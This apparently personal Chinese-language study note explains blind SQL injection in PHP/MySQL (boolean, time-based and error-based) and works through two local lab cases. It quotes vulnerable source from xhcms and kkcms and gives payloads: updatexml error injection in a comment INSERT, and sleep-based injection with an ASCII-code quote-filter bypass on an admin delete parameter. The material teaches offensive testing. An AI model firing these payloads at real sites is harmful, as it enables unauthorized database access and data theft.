---
title: PHP应用&SQL盲注&布尔回显&延时判断&报错处理&增删改查方式
published: 2025-10-27
description: SQL增删改查语句、SQL盲注：布尔回显、延时判断、报错处理，以及两个CMS案例。
tags: [PHP,WEB攻防,SQL注入]
category: 网络安全
draft: false
---

## 内容总结

> 1. mysql的增删改查功能
>
> 2. 根据源码sql语句的三种sql注入：布尔盲注（必须要有回显）
>
>    ​			延时判断（都可以）
>
>    ​			报错回显（必须要有报错处理机制）
>
> 3. 两个cms案例：
>
>    xhcms，kkcms
>
>    使用ascil进行单引号绕过。
>
> 4. 写的一个新闻网页，使用del过滤。

## 知识点

> PHP-MYSQL-SQL 操作-增删改查
>
> PHP-MYSQL-注入函数-布尔&报错&延迟
>
> PHP-MYSQL-注入条件-数据回显&错误处理
>
> PHP-MYSQL-CMS 案例-插入报错&删除延迟

## PHP—MYSQL—SQL 操作-增删改查

1. 功能：数据查询（注重数据回显）

   查询：

   ```sql
   SELECT * FROM news where id=$id
   ```

2. 功能：新增用户，添加新闻等（注重结果）
   增加：

   ```sql
   INSERT INTO news (字段名) VALUES (数据)
   ```

3. 功能：删除用户，删除新闻等（注重结果）
   删除：

   ```sql
   DELETE FROM news WHERE id=$id
   ```

4. 功能：修改用户，修改文章等（注重结果）
   修改：

   ```sql
   UPDATE news SET id=$id
   ```

### 演示

insert是如何进行注入的？

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4404.png)

## PHP—MYSQL—注入函数-布尔&报错&延迟

盲注就是在==注入过程中，获取的数据不能回显==至前端页面。

我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。

解决：常规的联合查询注入不行的情况

我们可以知道盲注分为以下三类：

### 基于布尔的 SQL 盲注-逻辑判断（需要有回显）

regexp,like,ascii,left,ord,mid

```sql
#检查当前数据库名称的长度是否为7。
and length(database())=7;

#left(a,b)，从左侧截取a的前b位。
#检查当前数据库名称的前一个字符是否为 'p'。
and left(database(),1)='p';
#检查当前数据库名称的前两个字符是否为 'pi'。
and left(database(),2)='pi';

#substr(a,b,c)，从位置b开始，截取字符串a的c长度。
#检查当前数据库名称的第一个字符是否为 'p'
and substr(database(),1,1)='p';
#检查当前数据库名称的第二个字符是否为 'i'
and substr(database(),2,1)='i';

#ord=ascii，ascii(p) = 112，判断p的ascii码是否等于112
#使用 ord 函数将第一个字符的ASCII值转换为整数，并检查它是否等于112
and ord(left(database(),1))=112;
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4401.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4402.png)

### 基于时间的 SQL 盲注-延时判断（可以不用回显及报错处理）

if,sleep

```php
#单地引入了一个1秒的延迟。如果应用程序响应时间增加了1秒，那么攻击者可以推断注入条件为真。
and sleep(1);
#if 函数被使用，但条件始终为假（1 > 2）。因此，sleep(1) 函数不会执行，而是返回0。这个语句的目的是验证条件的结果是否影响查询的响应时间。如果查询响应时间增加，说明注入条件为真。
and if(1>2,sleep(1),0);
#但这次条件为真（1 < 2）。因此，sleep(1) 函数将执行，导致查询延迟1秒钟。攻击者可以观察到响应时间的增加，从而确定注入条件为真。
and if(1<2,sleep(1),0);
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4403.png)

### 基于报错的 SQL 盲注-报错回显（需要报错处理的代码段）

```php
$data=mysqli_query($con,$sql) or die(mysqli_errno($con));
```

基于报错的SQL盲注是一种注入攻击技术，其中攻击者试图通过触发SQL错误来获取有关数据库结构和内容的信息。

使用方法：

```sql
#攻击者试图通过 updatexml 函数将波浪符 0x7e 连接到数据库版本号，从而引发错误并泄露版本信息。这是一种常见的基于报错的注入技术，攻击者可以通过观察错误消息来获取敏感信息。
and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)
#攻击者试图通过 extractvalue 函数获取 information_schema.tables 表的第一个表名。通过观察错误消息，攻击者可以逐步推断数据库结构。
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
```

> FLOOR:
>
> FLOOR 函数本身通常不直接用于报错注入。它是用于数值处理的函数，主要用于取整。
>
> 如果在使用 FLOOR 函数时传入了不正确的参数，可能导致SQL错误，但这通常不是攻击者首选的方法。

> updatexml:
>
> updatexml 函数在错误注入中可能是有用的。攻击者可以尝试构造一个恶意的 XML 语句，触发错误并泄漏有关数据库结构的信息。
>
> 示例：上述语句尝试通过 updatexml 函数将波浪符 0x7e 连接到数据库名称，从而引发错误并回显数据库名称。

> extractvalue:
>
> extractvalue 函数也可以用于错误注入。攻击者可以构造恶意的 XML 路径，触发错误并泄漏信息。
>
> 示例：上述语句尝试通过 extractvalue 函数将波浪符 0x7e 连接到当前用户的名称，从而引发错误并回显用户信息。
>
> ```sql
> extractvalue(1, concat(0x7e, (SELECT user())), 1)
> ```

#### 演示1

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4404.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4405.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4406.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4407.png)

#### 更多

[12种报错注入+万能语句 - 简书](https://www.jianshu.com/p/bc35f8dd4f7c)，需要注意的是数据库版本问题，不一定全部都适用。

```sql
like 'ro%'            #判断ro或ro...是否成立
regexp '^xiaodi[a-z]' #匹配xiaodi及xiaodi...等
if(条件,5,0)          #条件成立 返回5 反之 返回0
sleep(5)              #SQL语句延时执行5秒
mid(a,b,c)            #从位置b开始，截取a字符串的c位
substr(a,b,c)         #从位置b开始，截取字符串a的c长度
left(database(),1)，database() #left(a,b)从左侧截取a的前b位
length(database())=8  #判断数据库database()名的长度
ord=ascii ascii(x)=97 #判断x的ascii码是否等于97
```

## PHP—MYSQL—注入条件-数据回显&错误处理

PHP开发项目-输出结果&开启报错

1. 基于延时：**（报错和回显都不需要）**

   and if(1=1,sleep(5),0)

2. 基于布尔：有数据库输出判断标准盲注可用布尔盲注**（需要回显）**

   and length(database())=6

3. 基于报错：有数据库报错处理判断标准**（加入报错处理可利用报错盲注）**

   and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)

测试delete注入：**（有无回显，有无报错）**

删除（延迟）：1 and if(1=1,sleep(5),0)

删除（布尔）：3  and length(database())=6（无回显，无法判断注入）

删除（报错）：4 and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)

### 演示案例

news.html与news.php：

#### 尝试对删除功能进行注入

没有对数据进行回显操作，只有报错处理。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4409.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4408.png)



## PHP—MYSQL—CMS 案例-插入报错&删除延迟



> [!NOTE]
>
> **当对源代码进行分析时候，先观察能使用什么注入：**
>
> **有回显就使用布尔或者延时，有报错处理就使用报错或者延时，没有回显和报错就只能使用延时。**

****

### xhcms-insert报错

打开对应的源码

1. ctrl+shift+f：全局搜索：insert

2. 发现有报错处理：文件路径为：files/submit.php

3. 由于网址在index.php有规定，特殊的路由访问方式

4. 使用全局搜索：**?r=submit，发现是由files/contact.php路径触发**

5. 所以直接使用`http://localhost/?r=contact`触发网址，并对照源码发现，就是此页面

6. 再次查看submit.php，发现其SQL语句中的表名为**$query = "INSERT INTO interaction**，对应查找数据库，发现里面的内容，与contact.php页面留言表一一符合，及判断submit.php页面是实现评论提交功能；

7. 分析sql语句

   ```sql
   $query = "INSERT INTO interaction (type, xs, cid, name, mail, url, touxiang, shebei, ip, content, tz, date) VALUES ('$type', '$xs', '$cid', '$name', '$mail', '$url', '$touxiang', '$shebei', '$ip', '$content', '$tz', now())";
   ```

    发现有‘ ’影响，在注入时，需要避免。

8. 使用注入：

   ```sql
   ' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and '
   ```

9. 注意：留言内容必须是中文，不然会无法回显报错

10. 数据回显：新增错误：XPATH syntax error: '5.7.26’，盲注成功

##### 搜索关键字

ctrl+shift+f：全局搜索：insert，之后直接寻找$query相关代码，**发现在此处可以进行sql报错处理：文件路径为：files/submit.php**。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4410.png)

右键找到地址，复制地址可以看到路径。如果直接访问的该路径会直接报错。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4411.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4412.png)

分析发现是使用别的访问方式：

```php
// index.php
<?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET['r']); //接收文件名
$action=$file==''?'index':$file; //判断为空或者等于index
include('files/'.$action.'.php'); //载入相应文件
?>
```

于是尝试访问：(发现出现报错)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4413.png)

于是继续进行全局搜索：发现有个contact是需要此数据传递的

所以直接使用http://ip:8090/?r=contact 触发网址，并对照源码发现，就是此页面

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4415.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4414.png)

发现interaction和数据库对应上，也和网页对用上。此处就是接受评论的地方。

```php
// submit.php中的$query
$query = "INSERT INTO interaction (
type,
xs,
cid,
name,
mail,
url,
touxiang,
shebei,
ip,
content,
tz,
date
) VALUES (
'$type',
'$xs',
'$cid',
'$name',
'$mail',
'$url',
'$touxiang',
'$shebei',
'$ip',
'$content',
'$tz',
now()
)";
@mysql_query($query) or die('新增错误：'.mysql_error());
```

使用语句：

```sql
' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and '
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4416.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4417.png)

### kkcms-delete延时

全局搜索delete，发现有删除相关代码：文件路径为：admin/model/usergroup.php。

直接对usergroup.php进行访问。发现返回的空白（后台漏洞，需要先登录）。

由于usergroup.php只有后端页面，并没有对应前端数据显露，所以应继续使用该文件名搜索，查看是否有包含其的前端页面，进行匹配。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4419.png)

接下来就对/admin/cms_usergroup.php进行访问，发现返回了正常页面。

因为主要处理的代码还是在usergroup.php中，所以需要在其中寻找表，代码如下：

```php
// usergroup.php
<?php

if ($_GET['del'] == 1) {
	alert_back('默认会员组不能删除！');
} else {
	if (isset($_GET['del'])) {
		$sql = 'delete from xtcms_user_group where ug_id = ' . $_GET['del'] . '';
		if (mysql_query($sql)) {
			alert_href('删除成功!', 'cms_usergroup.php');
		} else {
			alert_back('删除失败！');
		}
	}
}
if (isset($_POST['save'])) {
	null_back($_POST['ug_name'], '请填写名称');
	$data['ug_name'] = $_POST['ug_name'];
	$str = arrtoinsert($data);
	$sql = 'insert into xtcms_user_group (' . $str[0] . ') values (' . $str[1] . ')';
	if (mysql_query($sql)) {
		alert_href('添加成功!', 'cms_usergroup.php');
	} else {
		alert_back('添加失败!');
	}
}
```

由于浏览器使用延时注入，没有回显时间，不好判断，所以使用抓包软件burp，或者有能力的话可以使用python写脚本来判断。

- 使用burp抓到对应包，发送至repeater，并在GET头加入**?del=4**发送包，查看是否成功`?del=4 or if(1=1,sleep(2),sleep(0))`。
- 回显200成功后，将`?del=4%20or%20if(1=1,sleep(1),sleep(0))`注入代码写入GET头，并查看右下角，发现有延时，注入成功。
- 需要注意，在写入GET头中的注入语句，需要将空格转换为%20字符，直接输入空格会报错，导致无法识别。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4420.png)

- `?del=4%20or%20if(length(database())=5,sleep(1),sleep(0))`将判断内容替换为，查询数据库名的个数，在输入5的时候，有延迟，及证明，数据库名有五位（可以查看右下角判断时间）。
- `?del=4%20or%20if(left(database(),1)='k',sleep(1),sleep(0))`将判断内容替换为检查当前数据库名称的第一个字符是否为 ‘k’。

发现，回显的数据包，并没有延时，但数据库名为kkcms。

将源码的sql语句打印出来，发现是源码对于**单引号**做了过滤。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4421.png)

- ord() 函数：
- ord() 函数返回字符串的第一个字符的 ASCII 值。
- 在这个语句中，ord(left(database(),1)) 返回当前数据库名称的第一个字符的 ASCII 值。

将`?del=4%20or%20if(ord(left(database(),1))=107,sleep(1),sleep(0))`将条件使用  ord() 函数包裹，并将k值转换为ASCII码（107），即可绕过单引号过滤。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4422.png)

## xhcms—搭建

如果在搭建过程中，遇到报错内容是找不到数据库的话，直接手动新建一个，之后创建成功内容会自己导入。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/xh01.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/xh02.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/xh03.png)

## kkcms—搭建

注意：使用此cms，php版本要在5.6.x，但是7.x.x好像也无法查看首页。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/kk01.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/kk02.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/kk03.png)

